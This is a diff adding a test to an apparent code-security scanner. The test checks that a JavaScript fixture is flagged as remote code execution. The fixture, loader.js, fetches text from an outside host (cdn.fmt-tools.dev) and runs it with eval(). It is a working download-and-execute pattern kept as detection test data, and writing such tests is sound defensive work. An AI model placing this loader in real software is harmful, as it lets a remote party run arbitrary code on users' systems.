@@ -107,6 +107,15 @@ def test_cli_explain_engine_json(tmp_path):
     assert [s["line"] for s in item["steps"]] == [2, 2, 3]
 
 
+def test_cli_explain_engine_chain_for_javascript(tmp_path):
+    (tmp_path / "loader.js").write_bytes(
+        b"const r = await fetch('https://cdn.fmt-tools.dev/p');\nconst code = await r.text();\neval(code);\n")
+    items = json.loads(_run(str(tmp_path), "--json").stdout)
+    engine = [i for i in items if i["kind"] == "engine"]
+    assert engine and engine[0]["rule"] == "HUSK-RCE-001" and engine[0]["language"] == "javascript"
+    assert [s["line"] for s in engine[0]["steps"]] == [1, 3]
+
+
 def test_cli_rules_lists_core_rules():
     r = _husk("rules", "--json")
     assert r.returncode == 0
